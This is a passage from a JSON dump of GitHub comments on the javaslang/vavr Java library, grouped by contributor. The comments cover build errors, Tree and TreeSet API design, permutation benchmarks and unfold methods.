\"10.0\", arch: \"amd64\", family: \"dos\"\nIt does work when I change the scala version to 2.10.6\n\nThere is the risk that it will still not work for some users, depending on the build environment.\n\nAFAIK Scala runs on the JVM, so it should not be dependent on the OS. Which Maven/JDK versions do you use?\n. \n@danieldietrich you're welcome. Let's check later with Gradle.\nJust some additional info: I've updated to a newer JDK 1.8.0_152, but it also produces the same result\n```\n[ERROR] Failed to execute goal net.alchim31.maven:scala-maven-plugin:3.3.1:script (default) on project vavr: \nwrap: java.lang.Exception: A NoSuchMethodError exception was thrown: \nscala.Predef$.refArrayOps([Ljava/lang/Object;)[Ljava/lang/Object; -> [Help 1]\n...\nD:\\Tmp\\javaslang>mvn -version\nApache Maven 3.3.9 (bb52d8502b132ec0a5a3f4c09453c07478323dc5; 2015-11-10T17:41:47+01:00)\nMaven home: C:\\Program Files (x86)\\JetBrains\\IntelliJ IDEA Community Edition 2017.1\\plugins\\maven\\lib\\maven3\\bin..\nJava version: 1.8.0_152, vendor: Oracle Corporation\nJava home: C:\\Program Files\\Java\\jdk1.8.0_152\\jre\nDefault locale: en_GB, platform encoding: Cp1252\nOS name: \"windows 10\", version: \"10.0\", arch: \"amd64\", family: \"dos\"\n```. ",
    "manu-m": "I will take a look on the sources within the next days. I hope I am able to implement these changes. At first let us define the requirements. A first draft:\n1) Changing Tree interface\nTree interface should be changed from\njava\npublic interface Tree<T> extends Traversable<T>\nto\njava\npublic interface Tree<T> extends Traversable<Node<T>>\nThis change seems to be trivial in general but I suspect that it desires many changes in implementations of this interface and their tests. I'm not sure if I'm able to do this in a proper way because I'm not very deep into javaslang's implementation details. But let me see what I can do.\n2) Parent reference in Tree/Tree.Node\nTree/Tree.Node should reference it's parent. The parent of a node can be retrieved by calling:\njava\nOption<Node<T>> getParent()\nIf returned Option object is empty, the node does not have a parent. \nFollowing questions have to be discussed in more detail for parent feature:\n1. Should the getParent method be added to Tree or to Tree.Node? Tree seems to be the better place because tree already contains methods like isLeaf, isBranch etc.\n2. How, when and by whom can the parent of a node assigned? Node objects are currently immutable and I think that's good. But how to respect this? I think being completely immutable will be hard because of the bidirectional parent-child relationship. My first idea is to set the parent of all children in the Node's constructor. This approach ensures at least that the parent cannot be modified from outside.\n``` java\nprivate Node parent;\npublic Node(T value, List> children) {\n    //...\n    this.children = children.peek(child -> child.setParent(this));\n    //...\n}\nprivate void setParent(Node parent)\n{\n    this.parent = parent;\n}\n@Override\npublic Option> getParent()\n{\n    return Option.of(parent);\n}\n```\n. I will take look at the unit tests in more detail within the next days. I think can do some contribution, although I don't like javaslang's style of unit test. I will do a new PR for these contributions.\n. I will make a PR. I am interested in how the generator works and I want to help this great project :-). If the PR doesn't comform to your quality standards you can still get your hands dirty ;-)\n. Oh, a little oversight. Thank you for the hint\n. ",
    "mattjtodd": "@danieldietrich I'd quite like to see if I can help out on this feature.\n. Yes, will do.\n. I think this issue can be closed now as the unfold and variants have been added in https://github.com/javaslang/javaslang/pull/1370?\nI do have a few comments about the widening which are causing issues with some samples I'm working on.  Where / how would you prefer I raise these?\n. ",
    "JohnMcGuinness": "_ will be an illegal identifier in JDK9. http://openjdk.java.net/jeps/213\n. ",
    "evacchi": "How about $_ ? \n. Yup that was my thinking!\n. Cool :)\n. Personally I'm not a fan of using _ in identifiers. You may be able to avoid it if it were acceptable to capitalize some identifiers. e.g.:\njava\nMatch(o).of(\n  Case(...).then(...), // notice that Case here would be a class \n  Case(...).then(...)\n)\njust throwing it in there.\n. ",
    "avitry": "I agree.  Interoperability is king. \nTranslating back en forth  between related types with close or identical (List e.g) and refrain usage. \n. ",
    "vicmosin": "@danieldietrich Would it be good to add some getLeftOrRight like get was? \n. I agree that since Either is right-biased now, it's useless to get either left or right, and it should be implemented explicitly as you suggested.\n. Any time ;-). ",
    "kmarwood": "@danieldietrich Thanks for the feedback and explanation! :-)\nI will update the test as per your suggestion.\n. Would your preference be for the new commit containing the additional test to be squashed into my previous commit to keep the commit history clean, or would you prefer a separate commit?\n. My pleasure!\n. ",
    "MarkusBarthlen": "Is there a convenience method for \n.map(mapper).flatMap(Option::of)\n\n? Such a method would be quite useful to not forget the .flatMap(Option::of).\nLet me add that I am a huge fan of your work. It wouldn't be an overstatement that vavr completely changed my (work) life.. ",
    "aaiezza": "Would the following also be appropriate?\njava\nOption.of(\"Hello World\").map(s -> null).filter(Objects::nonNull)...\nInstead of:\njava\nOption.of(\"Hello World\").map(s -> null).flatMap(Option::of).... ",
    "otrosien": "This is probably not the correct place to fix the issue, so I also opened https://github.com/javaslang/javaslang-docs/pull/16\n. ",
    "pivovarit": "I'm on it!\n. I guess it's done\n. You could consider using https://github.com/TouK/sputnik http://sputnik.ci/\nIt aggregates all most popular SCA tools and works nice with github.\nThis is how it works in practice:\nhttps://github.com/TouK/ThrowingFunction/pull/11\n. @danieldietrich this needs to be done by the someone who owns the repo. The good thing is that this can be just with a few clicks(2mins of work). Let me know if you need an assistance with this \n. CC: @pjagielski\n. @danieldietrich let's start with the default and then fine tune it. I suppose there will be a lot of tuning with such a codebase :) config files land in repo\n. @danieldietrich I removed SuppressWarnings annotations\n. You are welcome :)\n. I added crucial test cases and reused already implemented default nodeCount() method from Tree interface\n. hmmm, maybe nodeCount should be overridden and stored locally too?\n. Oh, sh*t. I'm on it\n. @ruslansennov I updated my commit\n. So you expect me to push both Generator.scala and updated generated files?\n. What's the point of keeping track of the generator and stuff it generates during compilation?\n. I prefer this approach too. Anyway, I updated my commit\n. @talios well, what if commiter is truly evil and commits fake generated files? ;)\n. @danieldietrich I updated my changes\n. I am not really nazi about this one. Works for me :) thanks\n. Would unzipSelf() be a proper name for this?\n. @danieldietrich keep in mind that if you need some consultations about the graphical side of things, Filip will be there to help :)\n. Ok, I am on it. I will officially kill my https://github.com/TouK/ThrowingFunction project and redirect my stars here :)\nSo API class is the right place for all of those methods?\n. @danieldietrich Um, I am afraid this was already implemented (but not included in the latest release).\nhttps://github.com/javaslang/javaslang/blob/cfb4f0f840a3b38545a61ed444cb1d3fdc48a96a/javaslang/generator/Generator.scala#L373\n. @danieldietrich running Sputnik locally is not possible but you can definitely run those tools that Sputnik uses (those can be included as a part of the build). Before doing this, it's good to create a local config for those tools (which will help with the whitespace problem mentioned earlier)\n. @danieldietrich ok, thanks for the clarification :). https://github.com/vavr-io/vavr/blob/master/CONTRIBUTING.md. Could you provide more details? what's the error message?. @danieldietrich fixed\n. @danieldietrich Both seem right to me, but I would stick to \"isNotNull\" since it seems to follow a certain convention. Other 3rd party libraries also seem to be using this one more often. First one that comes to my mind is assertj\n. @ruslansennov You reviewed faster than I managed to ask :D\n/\n     * Returns the number of nodes (including root and leafs).\n     \n     * @return The size of the tree.\n     /\nSo this should be applied recursively?\nI will add additional test cases. I guess existing are not enough\n. That it does not need to be recalculated each time for each leaf recursively\n. It's not really my idea. Check #1248 \nMemoization is imo worth thinking about, thanks!\n. I analyzed another classes and found out that there is no really any \"common denominator\" when considering importing strategy, @danieldietrich am I right?\n. Because someone omitted this when writing those classes.\nI think lazy init might be not the best case with recursive operations. The cost of calculating size when creating a single Node is nothing, but when you need to traverse whole tree and then compute size recursively for every Node it might be painful.\nAnyway, the best argument I can come up with is:\nAuthors seem to have followed the same principle when creating other classes eg. List\n. I agree. This is what I meant by \"memoization\". Making it lazy initialized at the beginning and then remembering the result after being used for the first time. I guess this issue is worth bringing up and applying globally in Javaslang\n. Well, this idea is pretty simple. Default methods are basically a redundant helper methods. You can obtain the same results by manipulating abstract methods\n. I believe an answer to your question is: yes, if I understood it correctly :)\n. @danieldietrich I am not sure if you get notifications when I force push an updated commit. I applied your last suggestions\n. There is a way of overriding the default config by adding some files locally. There it should be possible to tweak it.\n@pjagielski can you help?\n. ",
    "jest": "If you don't mind adding a single 15k JAR to the compilation dependencies (http://mvnrepository.com/artifact/org.osgi/osgi.annotation/6.0.1), that would be more than enough. It also allows us to mark some interfaces as @ConsumerType, which allows for more precise versioning consumer-vs-provider API.\n. Sorry, I wasn't clear. It's only a compilation dependency. The annotations \u2014 also the ones mentioned by you, e.g. @Version \u2014 are used by the OSGi tools (e.g. Bnd via maven-bundle-plugin) to generate the MANIFEST and discarded by VM on class load.\n. I'm a little confused here... Simply speaking: how adding some OSGi-specific numbers to the manifest (package versions) can complicate anything, esp. to non-OSGi users?\nI understand your concern about dependencies \u2014 if you don't want to use OSGi annotations, that's no problem. One packageinfo file per package is enough.\nIf you can use OSGi only for baselining tools, then so be it. It will just make OSGi people with no additional versioning info they need to reach the nirvana. :)\nIf you would like some more details about versioning in OSGi, please see (somewhat details) description here.\n. @danieldietrich Remember, that your feeling is only that; there are no technical reasons you should be concerned with package versions if you're not using OSGi. And OSGi users are used to different versions of different packages.\nBTW, the log that you sent suggests you introduced some backward compatibility in javaslang and javaslang.collection. Is it your private branch, or I can check out the details?\n. I'll take a look at it over the weekend.\nOne question: I still have problems choosing between Iterator and Seq implementations, probably due to my use cases (huge amounts of short-lived objects); what is the rationale of making the new slideBy return Seq instead of Iterator, as group* and sliding do (or maybe the other way round, why Iterator instead of Seq?) Behind the scene there will be a Vector anyway, so either return types are \"easy\" enough from the point of view of implementation.. OK, I'm working on it; as it is similar to sliding(), which is implemented in most of classes as iterator().sliding(...).map(...), I started with Iterator.sliding(), although I don't understand what you mean by \"but not performing an internal conversion to Stream\" in your comment.\nAs for the method signature, is C type variable necessary? It is not used anywhere in the signature, and the classifier results are compared using Object.equals(). So maybe such a signature is enough?\nIterator<? extends Traversable<T>> slideBy(Function<? super T,?> classifier);\n. Man, that is a whole lot of file editing for such a small feature. :-) Anyway, first result is in https://github.com/jest/javaslang/tree/slideby-feature. Initially naively copying Iterator.sliding() with small tweaks, and no tests.. OK, I'll add more tests in ~12 hours and issue a PR. OK, added tests. They fail however on HashSetTest due to \"random\" iteration order. Not sure how to warn a user about it (JavaDoc?) The same applies to sliding.\nShall I @Ignore the test in HashSetTest?. This is already there, https://github.com/jest/javaslang/commit/9e772804aeded7e74c614c4c81e226ba9d33cd82#diff-7e6e25e07a7b892583cb2ad871a61b53R1554, and yes, as assertThat is non-static, it is used from HashSetTest in its tests.. Not sure, just copy-pasted from sliding() tests and wanted them to look consistently. I thought about implementing permutations using Steinhaus\u2013Johnson\u2013Trotter algoritm (https://en.wikipedia.org/wiki/Steinhaus%E2%80%93Johnson%E2%80%93Trotter_algorithm). It is very efficient, as every permutation differs from the previous one by a single swap of two adjacent elements.\nGuava has a very nice implementation, in a form of generic Iterator depending on a single swap operation (https://github.com/google/guava/blob/master/guava/src/com/google/common/collect/Collections2.java#L652).. Looking at my benchmark from the Gitter:\n```\npublic void bench_dummy_no_permutation(Blackhole bh) {\n    Array> perms = Iterator.range(0, PERM_NUM).map(i -> {\n        Integer elem = arr.get(0);\n        return arr.remove(0).append(elem);\n    }).toArray();\nbh.consume(perms);\n\n}\n```\nand the results:\nVavrPermutationTest.bench_dummy_no_permutation  avgt   20   1.894 \u00b1 0.018  ms/op\n...\nVavrPermutationTest.bench_dummy_no_permutation  avgt   20    2.467 \u00b1 0.018  ms/op\nthere seems to be 30% increase of time for some combination of add/remove/map operations.\n. Thanks. That \"inline code generator\" would be great to open the decision about performance compromises (e.g. memory-time) to power users that may need them.. @ruslansennov Probably it is, although \"fast enough\" is always usage-dependant.\nI thought more general about S-T-J algorithm also in terms of memory reusing (e.g. as in Vector, where swap of two adjacent elements leaves most of trie branches untouched), but after rethinking, nobody will run permutations() on sequences long enough for storage sharing to make sense.\nI'll check how this PR performs later in the day.. master ce6f975\nBenchmark                                       Mode  Cnt    Score    Error  Units\nVavrPermutationTest.bench_dummy_no_permutation  avgt   20    2.417 \u00b1  0.037  ms/op\nVavrPermutationTest.bench_guava_permutation     avgt   20    2.699 \u00b1  0.022  ms/op\nVavrPermutationTest.bench_vavr_permutation      avgt   20  519.320 \u00b1 10.301  ms/op\nPR 403b7fc\nBenchmark                                       Mode  Cnt  Score   Error  Units\nVavrPermutationTest.bench_dummy_no_permutation  avgt   20  2.454 \u00b1 0.022  ms/op\nVavrPermutationTest.bench_guava_permutation     avgt   20  2.517 \u00b1 0.016  ms/op\nVavrPermutationTest.bench_vavr_permutation      avgt   20  1.791 \u00b1 0.018  ms/op\nHm, this is fast, suspiciously fast...\nSo I rerun the test with 9 elements in the array:\nBenchmark                                       Mode  Cnt   Score   Error  Units\nVavrPermutationTest.bench_dummy_no_permutation  avgt   20  28.672 \u00b1 0.361  ms/op\nVavrPermutationTest.bench_guava_permutation     avgt   20  25.231 \u00b1 0.383  ms/op\nVavrPermutationTest.bench_vavr_permutation      avgt   20  17.353 \u00b1 0.164  ms/op\nAnd with 10 elements in the array (large variance is probably to GC, not tuned JMH in this aspect in any way):\nBenchmark                                       Mode  Cnt     Score     Error  Units\nVavrPermutationTest.bench_dummy_no_permutation  avgt   20  1444.303 \u00b1  89.729  ms/op\nVavrPermutationTest.bench_guava_permutation     avgt   20   848.617 \u00b1  99.800  ms/op\nVavrPermutationTest.bench_vavr_permutation      avgt   20   327.846 \u00b1 245.760  ms/op\nSo if the result of permutation is correct, it is indeed much faster in this PR.. Rerun the last test, within more stabilized environment:\nVavrPermutationTest.bench_dummy_no_permutation  avgt   20  1519.123 \u00b1 81.149  ms/op\nVavrPermutationTest.bench_guava_permutation     avgt   20   776.917 \u00b1 43.621  ms/op\nVavrPermutationTest.bench_vavr_permutation      avgt   20   220.733 \u00b1  2.601  ms/op\nThe further, the merrier! :)\n. Hm, I'm not sure, probably Narayana's can handle the repeated elements (http://www.mafagafogigante.org/lexicographic-permutations/), when the \"grater-or-equal\" is  used in while loops. Of course we are working on indices instead of the elements, but with additional array to pi used for comparisons it should work.\nE.g. for [a, b, b, c] we would have pi = [0, 1, 2, 3] used for permutation generation and ci = [0, 1, 1, 2] used for comparisons in while-s. And swapping of course elements of both pi and ci simultaneously. I can try it on the weekend.\nAnyway, this is IMO a breaking change in the API?. One question: is the order of permutations in result an implementation detail, a \"nice-to-have\" feature (e.g. lexicographic order) or part of API?\nI'm not sure, I'll be easily able to handle repeated elements which are not grouped, like:\narr = [b, a, c, a, b]\npi=[0, 1, 2, 3, 4]\nci=[0, 1, 2, 1, 0]\nBecause ci is not first in the lexicographical order (of positions, as pi is) and I'll never get to permutation [b, b, a, a, c] (ci=[0, 0, 1, 1, 2]); hence, I can only generate lexicographical order in the sense of ci order, by first  grouping repeating elements, like [b, a, c, a, b] => [b, b, a, a, c] and generate permutation of that.\n. Now that I think of it, maybe we complicate too much? Maybe algorithms and data structures should be kept separate when the algorithm is non-trivial and selected implementation depends on the needs of the user (e.g. time vs. memory performance, structure vs. Iterator approach, lexicographical order vs. whatever, repeated elements allowed or not)? So, the default implementation should be \"fast enough\" for casual uses, and additional variants we discussed should be kept in a utility class? And only leave basic, data structure related code inside?\n@danieldietrich Do you see a place in Vavr for more complicated algorithms (permutations, combinations), or should it be a separe project?. ",
    "benoitheinrich": "Hi @danieldietrich,\nThanks for the quick answer !! that was really quick ;)\nIn fact your right, I was doing another test scenario to check how that new comparator would work and indeed, it applies to the mapped type U not the element type T.\nHere is the example:\n```\npublic class TreeSetTest {\n    @Test\n    public void testFlapMap() {\n        final TreeSet objs = TreeSet.ofAll((o1, o2) -> o1.field.compareTo(o2.field),\n                Stream.of(\"o1\", \"o2\").map(Obj::new)\n        );\n        // That works as you're using a TreeSet and so you can specify a Comparator\n        objs.flatMap((o1, o2) -> o1.differentField.compareTo(o2.differentField),\n                o -> List.of(new OtherObj(\"nicer \" + o.field)));\n    // That won't compile as the flatMap(c, f) is only defined on TreeSet\n    ((Set<Obj>) objs).flatMap((o1, o2) -> o1.differentField.compareTo(o2.differentField), \n            o -> List.of(new OtherObj(\"nicer \" + o.field)));\n}\n\nprivate static final class Obj {\n    private final String field;\n    private Obj(final String field) { this.field = field; }\n}\n\nprivate static final class OtherObj {\n    private final String differentField;\n    private OtherObj(final String differentField) { this.differentField = differentField; }\n}\n\n}\n```\nThere it's clear that the comparators are different.\nNow the tricky thing is that when you assign your TreeSet to a Set type, then the flatMap(comparator, function) method isn't available anymore.\nAnd because that Set could go quite far in your calls, when you get to do a flatMap then you might not know that the actual implementation is a TreeSet, and so, it will crash as soon as you use flatMap on a non-comparable U type.\nThen it means that when you want to use a TreeSet for your Set implementation, then either you need to make all your code aware that it's a TreeSet so you don't hit that issue by providing a compator when using flatMap.\nI'm not sure how people in general deal with this kind of issue, and I know that flatMap() is coming from the Traversable trait, but somehow it would be great if the code wouldn't compile with using the TreeSet.flatMap(f) where U is not a Comparable.\nI know it's probably not possible, especially if you cast your TreeSet into a Set ;)\nAt that point the compiler would just read it as if you use Set.flatMap(f) and not the TreeSet one.\nSo maybe if somehow we could make the code fail sooner in the stracktrace, then it might help people understanding why they get an error like I did ;)\nOr maybe make a special note in the documentation to emphasis this special behaviour of the TreeSet?\nTo be honest, it took me a bit of time to find where the problem was in my code.\n. Do you think that an naturalComparatorIfPossible comparator would be possible?\n```\n     Comparator naturalComparatorIfPossible() {\n        return new Comparator() {\n            Boolean useNatural = null;\n        @Override\n        public int compare(final T o1, final T o2) {\n            return useNatural(o1, o2)\n                    ? naturalComparator.compare(o1, o2)\n                    : unorderedComparator.compare(o1, o2);\n        }\n\n        private boolean useNatural(final T o1, final T o2) {\n            if (useNatural == null) {\n                useNatural = o1 instanceof Comparable || o2 instanceof Comparable;\n            }\n            return useNatural;\n        }\n    };\n}\n\n```\nThe check to verify the type of element would occur only once, and wouldn't require a catch to ClassCastException, and this would just add an additional boolean evaluation and a method call.\nIf you're worried about performance then you could maybe remove the method call and put everything in the compare() method.\nAlso that comparator should be thread-safe event if mutable as the only state shared is the boolean, and even if it's overridden, it shouldn't be an issue.\nThat comparator can't be shared across many trees as the useNatural is specific to a tree.\nDo you think this could work?\n. As discussed in gitter, here is an add-on for the requirements.\nWe would like to have the following function:\nMap<K, V> replace(K key, Function1<Option<V>, V> f);\nThis way we could do stuff like:\nMap<K, V> map = ...;\nmap.replace(key, old -> Match(old).of(\n                Case(Some($()), some -> ...), // Here you can add some functional code which modify the value\n                Case(None(), () -> ...) // Here you can add some functional code which provide a default value\n        ));\nA basic implementation could be something like that: \nMap<K, V> replace(K key, Function1<Option<V>, V> f) {\n        return put(key, get(key)\n                .map(v -> f.apply(Option.some(v)))\n                .getOrElse(() -> f.apply(Option.none()))\n        );\n    }\nThanks.\n. ",
    "kag0": "Hey all. Just ran into this exact same issue and agree with most of what's been said here. \nMy 2c on the issue: type erasure takes out a lot of good solutions. One available option is to change the signature of SortedSet flatMap(Function<T, Iterable>) in SortedSet to be Set flatMap(Function<T, Iterable>) and add a method SortedSet flatMapSorted(Function<T, U extends Comparable>). The contract of Set says if I have a Set and I flatMap it, I'll get back a Set, with no promises about order. That is something we are capable of fulfilling, and we probably need to, otherwise Set is extremely hard to program against (I'm saying maybe TreeSet.flatMap should return HashSet if there is no other option).\nOn the scala side, their SortedSet.flatMap returns either a Set or TreeSet depending on what you map to. It might be worth looking into how that is done to see if it can be done in java.\nLastly, I don't think it's been said here, but this same issue probably applies to .map as well.\n. The breaking change is a tough pill.\nSupposing an un-ordered Comparator was possible, would it be possible to tell when it should be used (as opposed to natural ordering) without attempting a Comparable cast? ~~Perhaps something like what @benoitheinrich proposed, but with additional constraints where in a.compareTo(b) b must be an instance of a.getClass().~~\nEDIT: Thought about the additional constraints more. While they would prevent the exceptions @ruslansennov pointed out, the idea has a major flaw where if Comparable were declared at the interface or abstract class then you could end up with an unordered SortedSet of Comparables. nasty.\n. Doesn't the lazy comparator have the same issue ruslan pointed out? The first non-null element of a set may be a Comparable, but a) that doesn't guarantee that the other non-null elements of the set are Comparable and b) doesn't guarantee that the first element can be compared to any of the other non-null elements.\nThis is the best I could come up with \n``` java\n// Note: this comparator imposes orderings that are inconsistent with equals.\npublic class Comparator implements java.util.Comparator {\n    public int compare(Object o1, Object o2) {\n        if(o1 == o2)\n            return 0;\n        if((o1 != null && o1.equals(o2)) || (o2 != null && o2.equals(o1)))\n            return 0;\n    // region problem area\n    if(o1 instanceof Comparable && (o2 != null && o1.getClass().isAssignableFrom(o2.getClass())))\n        return natural((Comparable)o1, o2);\n    // endregion\n\n    return hash(o1, o2);\n}\n\nprivate <T> int natural(Comparable<T> o1, T o2){\n    return o1.compareTo(o2);\n}\n\nprivate int hash(Object o1, Object o2){\n    return\n            (o1 == null\n                ? 0\n                : o1.hashCode())\n            - (o2 == null\n                ? 0\n                : o2.hashCode());\n}\n\n}\n```\nThis correctly avoids the issue ruslan pointed out, but the problem area opens up an insidious behavior (demonstrated by the last assertion in the test). \n``` java\npublic class ComparatorTest {\n    @org.junit.Test\n    public void compare() throws Exception {\n        java.util.Comparator wonkyComparator = new Comparator();\n    // ints\n    assertEquals(Integer.compare(5, 9), wonkyComparator.compare(5, 9));\n\n    // anon objects\n    Object a = new Object(){\n        int someField = 7;\n    };\n    Object b = new Object(){\n        String hello = \"world\";\n    };\n    System.out.println(wonkyComparator.compare(a, b));\n    assertNotEquals(0, wonkyComparator.compare(a, b));\n    assertEquals(wonkyComparator.compare(a, b), -wonkyComparator.compare(b, a));\n\n    // same interface, different comparable subclasses\n    R1 r1 = new R1();\n    r1.val = 1;\n    R2 r2 = new R2();\n    r2.val = 2;\n    System.out.println(wonkyComparator.compare(r1, r2)); // no exception, yay\n\n    // comparable interface, different subclasses\n    T1 t1 = new T1();\n    t1.val = 1;\n    T2 t2 = new T2();\n    t2.val = 2;\n    assertEquals(t1.compareTo(t2), wonkyComparator.compare(t1, t2)); // oh crud\n}\n\ninterface T extends Comparable<T>{\n    int val();\n}\n\nclass T1 implements T{\n    int val;\n\n    @Override\n    public int val() {\n        return val;\n    }\n\n    @Override\n    public int compareTo(T o) {\n        return Integer.compare(val, o.val());\n    }\n}\n\nclass T2 implements T{\n    int val;\n\n    @Override\n    public int val() {\n        return val;\n    }\n\n    @Override\n    public int compareTo(T o) {\n        return Integer.compare(val, o.val());\n    }\n}\n\ninterface ruslansennov{\n}\n\nclass R1 implements ruslansennov, Comparable<R1>{\n    int val;\n\n    @Override\n    public int compareTo(R1 o) {\n        return Integer.compare(val, o.val);\n    }\n}\n\nclass R2 implements ruslansennov, Comparable<R2>{\n    int val;\n\n    @Override\n    public int compareTo(R2 o) {\n        return Integer.compare(val, o.val);\n    }\n}\n\n}\n. java\n if (hash1 < hash2) {\n  return -1;\n} else if (hash1 > hash2) {\n  return 1;\n}\n```\nThis seems reasonable. I agree that the reflection is some intense code smell though. Just returning -1 seems like the only plausible way to resolve the hash collision, but that itself smells as well.\n. > I see no other solution that returning a Set.\nAgreed. I think diligence has been done to find a solution to avoid a non breaking-change, but there is none that I can conceive.\n. ",
    "pjagielski": "Yes. In Github with Travis setup it's not used at all. It was introduced to support CircleCI, because it doesn't start build on pull request submission. The hard thing is that we don't know in advance, whether you'd use Travis or CircleCI and it's easy to change from one to another. \nWe need admin to delete webhooks when Sputnik is being tunb off (write is not enough).\nI hope it's more clear now, maybe we can put this explanation somewhere in Sputnik wiki..\n. Yes, under project' settings, there is a \"I have my own config\" checkbox which allows you to select a file from repo to use as checkstyle/findbugs/pmd config: \n\n\n. ",
    "jknack": "jooby is on javaslang 2.0.0... and didn't realize the class was removed from 2.x. I have a proof of concept working example with \u03bbModule.ReflectionUtil :)\nToday, jooby supports script/inline routes. They look like this:\njava\nget(\"/\", req -> {\n  return ...;\n});\nIf you need access to a HTTP param, then:\njava\nget(\"/\", req -> {\n  int foo = req.param(\"foo\").intValue();\n  return ...;\n});\nIt's not bad and the param API is good...\nNow, saw you were able to detect param types and hack type erasure in 1.x with that I was able to say for example:\njava\nget(\"/:id\", (String id, Integer foo) -> {\n  // ...\n  return ...;\n});\nThis way the route looks more \"natural\" and don't force users to get a reference to the request.\nThe idea was to extend jooby router with your CheckedFunction[X], detect the param types and call the param API behind the scene.\nmake sense?\n. Awesome! It works for me, but... if you already removed it from 2.0.0 I feel bad if you will add it just for me. I can probably copy what you did from 1.x branch and add it to jooby.\nAnyway, your call... if you add it, I will reuse it. Otherwise, will copy what you did ;)\nThanks a lot @danieldietrich!\n. What if you provide a Case(T, *) where * is a Function or Supplier. Then inside the Case(T, *) you test for predicate or not:\njava\nCase(T value, Supplier supplier) {\n  final Predicate predicate;\n  if (value instanceof Predicate) {\n     predicate = (Predicate) value;\n  } else {\n     predicate = $(value);\n  }\n  return Case(predicate, supplier);\n}\ndoes it help?\nAlso, think a built-in default case will be helpful too:\njava\nMatch(value).of(\n  Case(1, \"1\"),\n  Case(2, \"2\"),\n  Case_(\"?\")\n);\nOr:\njava\nMatch(value).of(\n  Case(1, \"1\"),\n  Case(2, \"2\"),\n  Case_(() -> {\n    throw new IllegalArgumentException(value);\n  }),\n);\nI suggest Case_ but this is just an example, you can pick a better name.\nIdeally/Optionally, the special Case_ could throw an Exception:\njava\nMatch(value).of(\n  Case(1, \"1\"),\n  Case(2, \"2\"),\n  Case_(IllegalArgumentException::new)\n);\nWhat do you think?\n. my bad!\nI didn't get the comments on XXX methods and yes! Match().option is what I need it!\nLooking forward for 2.0.2\nThanks!\n. I can wait :)\nEnjoy it!\n. hehehe you rock man!\n. Don't you like always?\nTry.run(() -> runSomething())\n    .always(() -> session.close());\nor after, done or finallyRun\n. Like the idea! but don't love the WithResources(...)... what if we do the same but using something like this:\njava\nTry.with(this::getSession, session -> {\n  // work with session and return something\n  return ...;\n})\nIt works as your example... but feel we type less and we don't create or have to remember a new construction: WithResources\nAlso, it probably read better by moving the closeable supplier at the end:\njava\nTry.with(session -> {\n  // work with session and return something\n  return ...;\n}, this::getSession)\n. ",
    "nicholasren": "Hi guys, \nis there any further action on this PR?\n. No problem,\nI was wondering if I missed something  :smile: \nCool, I'll leave it to our leader \n. in the default implementation of unzip*, what do you recommend the concrete class? Hashset?\n@danieldietrich  . I made the padding method to return a new StringBuilder  intentionally,  pay a small cost to make it more readable.\n. the if (length <= 1) is required as it is the termination condition of recursion.\nit has to be length <= 1 instead of  length <= 0 because I've already prepend an element before the recursion call.\nI'll try to make it more explicit.\n. Yep, changed.\n. I was trying to avoid using length() on Stream as Stream is an lazy collection, while calling length() on a Stream object will trigger a full evaluation.\nBut looks like both padTo and leftPadTo have to full evaluate the whole stream any  way, you solution works pretty well.\nShall we make it explicit that these methods should be carefully used on Stream?\n. Pretty happy to work on projecteuler stuff.\n. ",
    "sajit": "Hello there. first time foray into trying to contribute to OSS project so please forgive if this sounds stupid. Just that I understand the requirement you want this method to return IndexedSeq <CharSeq>\n. Sorry about the unresponsiveness.. Had some family emergency. \n. ",
    "emmanueltouzery": "Maybe splitSeq and @Deprecated on split?\n. regarding the analogy to iterate, the difference is that for iterate the input to the next iteration is necessarily the result of the current iteration, while with unfold you are free to specify any input (plus the fact that the termination is builtin, but that's more a detail I think).\nFor instance the situation I needed it in was with Scanner:\nScanner scanner = new Scanner(input);\n    return unfold(\n        scanner,\n        s -> Option.of(s.findInLine(regex))\n        .map(f -> new Tuple2<>(s.match(), s)));\nSo here I keep passing the scanner as input for the next iteration, while in the return list I put the matches. It's actually unnecessary in this case, and iterate would be enough for this case, since Scanner is side-effect based and mutable.. If Scanner was immutable and would return a new Scanner when you modify it, then unfold would be needed. As it is, you can just refer to the outside Scanner from iterate, but I think there will be situations where the full unfold will come in handy.\nOtherwise I lifted the API from the haskell stdlib\n. Yes. I thought about that, I didn't do it or mention it because I wanted to find out whether you're interested at all, and also I'm not sure whether it really makes sense for Set? It could generate two elements which are equal and they would appear only once in the set, that would be a bit strange wouldn't it?\nBut yes, for Seq and List at least it makes sense.\n. So waiting for the answer on whether it makes sense also for Set before I resubmit. If it shouldn't be done for Set, we could implement it on the Seq interface?\n. Just two things:\n1. The example @paplorinc provided is from the apidoc in the PR, which i lifted from the haskell apidoc. It suggests maybe we need a better example in the doc but i can't think of a short standalone one.\n2. Afaik haskell provides only unfoldr? See also http://stackoverflow.com/questions/23779494/why-the-r-in-unfoldr - but yeah why stop there.\nOk i'll probably work on it through the week-end. Implementation on Iterator, all Seq implementations get it.\n. Yeah the reason haskell only provides a right unfold is because it only provides list unfold and a list left unfold would have disastrous performance.\n. Hmm maybe I had the wrong understanding of what would be a left unfold. I thought it would build the list from the left, so doing appends in a loop, instead of prepends in a list for a right unfold. But maybe I wrong in this understanding. I'll try to google for left unfold implementations somewhere to make sure.\n. So I looked into building the unfold implementation on Iterator. Turns out it's a poor fit for unfoldRight, but a very elegant one for unfoldLeft. The left unfold appends each new value that is obtained to the result sequence. That works great with the Iterator API.\nThe right unfold however prepends each new value that is obtained to the result. That doesn't work at all with the Iterator API... We would have to expand the whole iterator in memory then revert it.\nI don't know enough the javaslang collections hierarchy... One idea that I have from the top of my head right now is to have the unfoldLeft implementation in Iterator, and the unfoldRight in each specifc type: List, Seq..?\nBtw just curious about fold being a left fold but with a single type instead of two. Is it meant to make the job simpler for the type checker?\nPS: for reference, haskell's Data.Sequence implements both unfoldr & unfoldl\n. I guess one question is, do we want to offer unfoldRight on Iterator for coherence/symetry although it's widely inefficient?\nIn any case List will keep its custom more efficient version.\n. hmm well also List.unfoldRight must reverse the list in the end... Maybe then it can also call Iterator.unfoldRight and performance is the same in the end...\n. I pushed a commit which is closer to what we want, I think. I wrote that we still need the normal fold call, plus a more tolerant type for the Function<> (with proper use of super & extends and so on). However I'm not sure about the fold?\nIf the type will be <T,T> instead of <T,U> then I'm not sure it brings much over iterate?\n. hmm but otherwise we still want to export Iterator.unfold* right? If that's case why does it help to move the implementation somewhere else?\n. Thanks for spelling it out about the widening! I'll make the changes tomorrow. There was another open question: do we implement an unfold besides unfoldLeft and right?\nI wrote: \n\nHowever I'm not sure about the fold?\nIf the type will be  instead of  then I'm not sure it brings much over iterate?\n. Ok I widened the type signatures. Note that I tried simply 